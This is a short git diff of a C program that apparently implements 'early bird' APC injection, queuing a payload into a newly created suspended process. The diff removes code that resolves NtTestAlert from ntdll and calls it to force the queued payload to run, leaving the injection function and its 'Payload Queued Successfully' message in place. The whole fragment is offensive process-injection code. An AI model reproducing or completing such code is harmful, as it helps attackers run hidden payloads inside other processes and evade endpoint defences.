@@ -2,8 +2,6 @@
 #include <stdio.h>
 #include <tlhelp32.h>
 
-#pragma comment(lib, "ntdll")
-typedef NTSTATUS(NTAPI* myNtTestAlert)();
 
 // implement early bird injection using APC injection technique on a newly created process in suspended mode.
 #define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
@@ -104,17 +102,6 @@ BOOL QueueEarlyBirdAPCInjection(IN HANDLE hProcess, IN HANDLE hThread, IN LPVOID
 
 	okay("Payload Queued Successfully, PRESS ENTER");
 	getchar();
-
-
-	// GetModuleHandle to ntdll.dll
-	HMODULE hNtdll = GetModuleHandle(L"ntdll");
-	// GetProcAddress to NtTestAlert
-
-	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert"));
-	//fireing up the payload by forcing the queue to be clear via NtTestAlert
-	testAlert();
-
-	info("executing test alert to ensure that the APC is queued properly, PRESS ENTER");
 
 	return TRUE;
 }
